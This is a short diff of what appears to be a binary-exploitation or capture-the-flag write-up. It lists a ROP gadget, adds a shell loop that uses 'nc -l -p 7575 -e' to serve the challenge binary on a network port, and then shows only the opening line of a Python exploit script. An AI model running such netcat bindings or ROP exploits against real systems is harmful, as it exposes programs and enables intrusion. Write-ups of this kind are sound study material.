@@ -94,7 +94,18 @@ Writing ROP gadgets to file: 23e4f31a5a8801a554e1066e26eb34745786f4c4-rop.txt ..
 0x80495de: add cl,cl; ret
 ```
 
-Exploit from
+Running as daemon
+
+```
+$ cat fakeserver.sh
+while true;
+do
+  nc -l -p 7575 -e ./23e4f31a5a8801a554e1066e26eb34745786f4c4
+done
+```
+
+
+Exploit
 ```
 #!/usr/bin/env python
 
